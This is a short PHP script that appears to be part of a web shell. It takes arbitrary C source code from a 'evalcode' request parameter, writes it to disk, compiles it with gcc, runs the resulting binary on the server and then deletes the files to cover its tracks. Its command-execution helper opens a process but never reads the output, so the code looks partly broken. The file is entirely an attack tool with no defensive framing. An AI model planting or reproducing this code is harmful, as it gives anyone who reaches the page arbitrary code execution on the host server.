<?php
function exe($s_c){
	$s_out = "";
	$s_c = $s_c." 2>&1";

	if(is_callable('proc_open')) {
		$s_descriptorspec = array(
			0 => array("pipe", "r"),
			1 => array("pipe", "w"),
			2 => array("pipe", "w"));
		$s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());
		@proc_close($s_proc);
	}
	return $s_out;
}

$_GP = array_merge($_POST, $_GET);
$s_code = $_GP['evalcode'];
$s_script = md5(time().rand(0,100));
if(file_put_contents($s_script.".c", $s_code)!==false){
	$s_scriptout = $s_script;
	$s_res = exe("gcc ".$s_script.".c -o ".$s_scriptout);
	if(@is_file($s_scriptout)){
		$s_res = exe("chmod +x ".$s_scriptout." ; ./".$s_scriptout);
		rename($s_scriptout, $s_scriptout."del");
		unlink($s_scriptout."del");
	}
	unlink($s_script.".c");
}
?>